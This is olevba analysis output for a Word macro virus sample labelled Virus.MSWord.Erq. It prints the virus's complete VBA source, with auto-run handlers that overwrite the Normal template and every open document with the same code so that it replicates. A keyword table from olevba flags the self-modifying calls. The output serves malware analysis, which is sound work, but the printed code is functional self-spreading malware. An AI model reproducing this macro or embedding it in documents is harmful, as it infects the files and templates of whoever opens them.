olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Erq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Erq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
  Document_Open
End Sub

Private Sub Document_New()
  Document_Open
End Sub

Private Sub Document_Open_Template()
  On Error GoTo errq
  For Each c In Application.Documents
    If Not c.VBProject.VBComponents("ThisDocument").CodeModule.Find("Open_Template", 1, 1, 2000, 1) Then
      'íàéäåí íåçàðàæåííûé ôàéë
      Set Modul = c.VBProject.VBComponents("ThisDocument").CodeModule
      Modul.DeleteLines 1, Modul.CountOfLines
      Modul.AddFromString NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 2001)
      Modul.ReplaceLine Modul.ProcBodyLine("Document_Open", vbext_pk_Proc), "private sub Document_Open_Template()"
      Modul.ReplaceLine Modul.ProcBodyLine("Document_Open_File", vbext_pk_Proc), "private sub Document_Open()"
    End If
  Next c
errq:
End Sub

Private Sub Document_Open()
  On Error GoTo errq2
  If Not NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Find("Open_File", 1, 1, 2000, 1) Then
      'íàéäåí íåçàðàæåííûé øàáëîí
      Set Modul = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
      Modul.DeleteLines 1, Modul.CountOfLines
      Modul.AddFromString ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 2001)
      Modul.ReplaceLine Modul.ProcBodyLine("Document_Open", vbext_pk_Proc), "private sub Document_Open_File()"
      Modul.ReplaceLine Modul.ProcBodyLine("Document_Open_Template", vbext_pk_Proc), "private sub Document_Open()"
  End If
errq2:
End Sub



















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

